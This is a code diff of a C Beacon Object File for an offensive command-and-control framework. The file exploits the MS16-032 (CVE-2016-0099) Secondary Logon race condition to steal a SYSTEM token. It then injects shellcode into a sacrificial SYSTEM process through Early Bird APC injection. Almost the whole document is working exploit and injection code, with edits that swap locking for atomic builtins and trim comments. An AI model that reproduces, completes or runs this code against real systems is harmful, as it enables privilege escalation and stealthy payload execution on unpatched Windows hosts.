@@ -3,20 +3,14 @@
 
 /* ------------------------------------------------------------------ */
 /*  MS16-032 Local Privilege Escalation BOF                            */
-/*  CVE-2016-0099 — Race condition in Secondary Logon Service          */
+/*  CVE-2016-0099 - Race condition in Secondary Logon Service          */
 /*                                                                     */
 /*  The seclogon service (running as SYSTEM) processes                  */
 /*  CreateProcessWithLogonW requests. When multiple threads race this   */
-/*  call, the service can confuse which client it's servicing and       */
+/*  call, the service can confuse which client it is servicing and      */
 /*  assign its own SYSTEM token as the primary token of the child       */
 /*  process. We detect this by checking each spawned child's token.     */
 /* ------------------------------------------------------------------ */
-
-#ifndef NTSTATUS
-#define NTSTATUS LONG
-#endif
-
-#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 
 #ifndef SECURITY_MANDATORY_SYSTEM_RID
 #define SECURITY_MANDATORY_SYSTEM_RID 0x00004000
@@ -27,14 +21,19 @@
 #define MAX_EXPLOIT_ATTEMPTS   15
 
 /* ------------------------------------------------------------------ */
-/*  Shared race state                                                   */
+/*  Shared race state                                                  */
+/*                                                                     */
+/*  fFound/fStop use GCC __sync builtins for atomic access.            */
+/*  InterlockedExchange/InterlockedCompareExchange are compiler        */
+/*  intrinsics, NOT kernel32.dll exports, so they cannot be resolved   */
+/*  by the BOF loader. __sync builtins compile to inline lock cmpxchg  */
+/*  instructions with no DLL dependency.                               */
 /* ------------------------------------------------------------------ */
 
 typedef struct {
     volatile LONG   fFound;         /* 1 = SYSTEM token found          */
     volatile LONG   fStop;          /* 1 = all threads should exit     */
     HANDLE          hSystemToken;   /* duplicated SYSTEM token         */
-    CRITICAL_SECTION cs;            /* protects hSystemToken write     */
 } RACE_STATE;
 
 /* ------------------------------------------------------------------ */
@@ -87,7 +86,7 @@ static BOOL ValidateSystemToken(HANDLE hToken) {
     KERNEL32$LocalFree(sidStr);
     if (!isSys) return FALSE;
 
-    /* Integrity level must be System (optional — some tokens lack this) */
+    /* Integrity level should be System */
     if (ADVAPI32$GetTokenInformation(
             hToken, TokenIntegrityLevel, ilBuf, sizeof(ilBuf), &retLen)) {
         TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL*)ilBuf;
@@ -120,23 +119,23 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
     int                  iter;
 
     MSVCRT$memset(&si, 0, sizeof(si));
-    si.cb         = sizeof(si);
-    si.dwFlags    = STARTF_USESHOWWINDOW;
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
 
     for (iter = 0; iter < MAX_RACE_ITERATIONS; iter++) {
 
-        /* Check if another thread already won or we were told to stop */
-        if (KERNEL32$InterlockedCompareExchange(&pState->fFound, 0, 0) ||
-            KERNEL32$InterlockedCompareExchange(&pState->fStop, 0, 0))
+        /* Check if another thread already won or main thread says stop */
+        if (pState->fFound || pState->fStop)
             break;
 
         MSVCRT$memset(&pi, 0, sizeof(pi));
 
         /* The race target: CreateProcessWithLogonW
-         * With LOGON_NETCREDENTIALS_ONLY, seclogon doesn't validate creds
-         * but still processes the token assignment path that has the race.
-         * CREATE_SUSPENDED keeps the child alive so we can inspect it. */
+         * LOGON_NETCREDENTIALS_ONLY means seclogon does not validate
+         * the credentials, but still hits the token assignment path
+         * that contains the race condition.
+         * CREATE_SUSPENDED keeps the child alive for token inspection. */
         if (!ADVAPI32$CreateProcessWithLogonW(
                 L"foo", L"bar", L"baz",
                 LOGON_NETCREDENTIALS_ONLY,
@@ -152,35 +151,34 @@ static DWORD WINAPI RaceThread(LPVOID lpParam) {
         if (ADVAPI32$OpenProcessToken(
                 pi.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hChildToken)) {
 
-            /* Check if the child got SYSTEM's token */
+            /* Did the child get SYSTEM's token from the race? */
             if (ValidateSystemToken(hChildToken)) {
 
-                /* Duplicate for later use (full access) */
+                /* Duplicate the token for later use */
                 hDupToken = NULL;
                 if (KERNEL32$DuplicateHandle(
                         KERNEL32$GetCurrentProcess(), hChildToken,
                         KERNEL32$GetCurrentProcess(), &hDupToken,
                         TOKEN_ALL_ACCESS, FALSE, 0)) {
 
-                    KERNEL32$EnterCriticalSection(&pState->cs);
-                    if (!pState->hSystemToken) {
+                    /* Atomic CAS: first thread to flip 0->1 wins */
+                    if (__sync_bool_compare_and_swap(&pState->fFound, 0, 1)) {
                         pState->hSystemToken = hDupToken;
-                        KERNEL32$InterlockedExchange(&pState->fFound, 1);
                     } else {
+                        /* Another thread already won */
                         KERNEL32$CloseHandle(hDupToken);
                     }
-                    KERNEL32$LeaveCriticalSection(&pState->cs);
                 }
             }
             KERNEL32$CloseHandle(hChildToken);
         }
 
-        /* Kill the child — we either got its token or it's not useful */
+        /* Kill the child process - we got its token or it is not useful */
         KERNEL32$TerminateProcess(pi.hProcess, 0);
         KERNEL32$CloseHandle(pi.hProcess);
         KERNEL32$CloseHandle(pi.hThread);
 
-        /* Short yield to let other threads compete in the race */
+        /* Yield to let other threads compete in the race */
         KERNEL32$Sleep(0);
     }
 
@@ -207,7 +205,7 @@ static BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privName) {
 }
 
 /* ------------------------------------------------------------------ */
-/*  Beacon injection — Early Bird APC into sacrificial SYSTEM process   */
+/*  Beacon injection - Early Bird APC into sacrificial SYSTEM process   */
 /*  RW->RX memory protection, QueueUserAPC (no CreateRemoteThread).    */
 /* ------------------------------------------------------------------ */
 
@@ -225,7 +223,7 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
     MSVCRT$memset(&pi, 0, sizeof(pi));
     si.cb = sizeof(si);
 
-    /* Method 1: CreateProcessWithTokenW (needs SeImpersonatePrivilege) */
+    /* Method 1: CreateProcessWithTokenW */
     created = ADVAPI32$CreateProcessWithTokenW(
         hSystemToken, 0, NULL, target,
         CREATE_SUSPENDED | CREATE_NO_WINDOW,
@@ -233,10 +231,10 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
 
     if (!created) {
         BeaconPrintf(CALLBACK_OUTPUT,
-            "[*] CreateProcessWithTokenW failed (%d), trying impersonation...",
+            "[*] CreateProcessWithTokenW failed (%d), trying impersonation",
             KERNEL32$GetLastError());
 
-        /* Method 2: Impersonate, then CreateProcessAsUserW */
+        /* Method 2: Impersonate SYSTEM, then CreateProcessAsUserW */
         if (ADVAPI32$ImpersonateLoggedOnUser(hSystemToken)) {
             impersonating = TRUE;
             created = ADVAPI32$CreateProcessAsUserW(
@@ -279,7 +277,7 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
         goto fail;
     }
 
-    /* Flip RW -> RX (no RWX) */
+    /* Flip RW -> RX */
     if (!KERNEL32$VirtualProtectEx(
             pi.hProcess, pRemote, scLen,
             PAGE_EXECUTE_READ, &oldProt)) {
@@ -289,7 +287,7 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
         goto fail;
     }
 
-    /* Queue APC on suspended main thread — fires before entry point */
+    /* Queue APC on suspended main thread - fires before entry point */
     if (!KERNEL32$QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
         BeaconPrintf(CALLBACK_ERROR,
             "[-] QueueUserAPC failed: %d", KERNEL32$GetLastError());
@@ -297,11 +295,11 @@ static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
         goto fail;
     }
 
-    /* Resume — APC executes our shellcode */
+    /* Resume thread - APC fires and executes our shellcode */
     KERNEL32$ResumeThread(pi.hThread);
 
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[+] Beacon injected via Early Bird APC — should check in shortly");
+        "[+] Beacon injected via Early Bird APC");
     KERNEL32$CloseHandle(pi.hProcess);
     KERNEL32$CloseHandle(pi.hThread);
     return TRUE;
@@ -337,11 +335,11 @@ void go(char* args, int len) {
         return;
     }
 
-    /* ---- Pre-flight: CPU count (race requires 2+ cores) ---- */
+    /* ---- Pre-flight: CPU count ---- */
     KERNEL32$GetSystemInfo(&sysInfo);
     if (sysInfo.dwNumberOfProcessors < 2) {
         BeaconPrintf(CALLBACK_ERROR,
-            "[-] MS16-032 requires 2+ logical CPUs (found %d)",
+            "[-] MS16-032 requires 2+ logical CPUs, found %d",
             sysInfo.dwNumberOfProcessors);
         return;
     }
@@ -352,7 +350,7 @@ void go(char* args, int len) {
         "[*] CPUs: %d | Shellcode: %d bytes",
         sysInfo.dwNumberOfProcessors, scLen);
 
-    /* ---- Best-effort: enable SeImpersonatePrivilege ---- */
+    /* ---- Enable privileges ---- */
     if (ADVAPI32$OpenProcessToken(
             KERNEL32$GetCurrentProcess(),
             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
@@ -364,7 +362,6 @@ void go(char* args, int len) {
 
     /* ---- Initialize race state ---- */
     MSVCRT$memset(&state, 0, sizeof(state));
-    KERNEL32$InitializeCriticalSection(&state.cs);
 
     /* ---- Exploitation loop ---- */
     for (attempt = 0; attempt < MAX_EXPLOIT_ATTEMPTS; attempt++) {
@@ -372,12 +369,12 @@ void go(char* args, int len) {
         if (state.hSystemToken) break;
 
         BeaconPrintf(CALLBACK_OUTPUT,
-            "[*] Attempt %d/%d — racing seclogon...",
+            "[*] Attempt %d/%d - racing seclogon...",
             attempt + 1, MAX_EXPLOIT_ATTEMPTS);
 
-        /* Reset state for this attempt */
-        KERNEL32$InterlockedExchange(&state.fFound, 0);
-        KERNEL32$InterlockedExchange(&state.fStop, 0);
+        /* Reset flags for this attempt */
+        state.fFound = 0;
+        state.fStop  = 0;
 
         /* Launch race threads */
         numThreads = 0;
@@ -393,14 +390,12 @@ void go(char* args, int len) {
             break;
         }
 
-        /* Wait for all threads to finish (they self-limit iterations) */
+        /* Wait for threads to finish their iterations */
         KERNEL32$WaitForMultipleObjects(
             numThreads, hThreads, TRUE, 60000);
 
-        /* Signal stop in case any thread is still going */
-        KERNEL32$InterlockedExchange(&state.fStop, 1);
-
-        /* Brief wait for stragglers then close handles */
+        /* Signal stragglers to stop */
+        state.fStop = 1;
         KERNEL32$WaitForMultipleObjects(
             numThreads, hThreads, TRUE, 5000);
 
@@ -414,14 +409,12 @@ void go(char* args, int len) {
         }
     }
 
-    KERNEL32$DeleteCriticalSection(&state.cs);
-
     if (!state.hSystemToken) {
         BeaconPrintf(CALLBACK_ERROR,
             "[-] Failed to obtain SYSTEM token after %d attempts",
             MAX_EXPLOIT_ATTEMPTS);
         BeaconPrintf(CALLBACK_ERROR,
-            "[-] Target may be patched (MS16-032 / KB3139914)");
+            "[-] Target may be patched - check for KB3139914");
         return;
     }
 
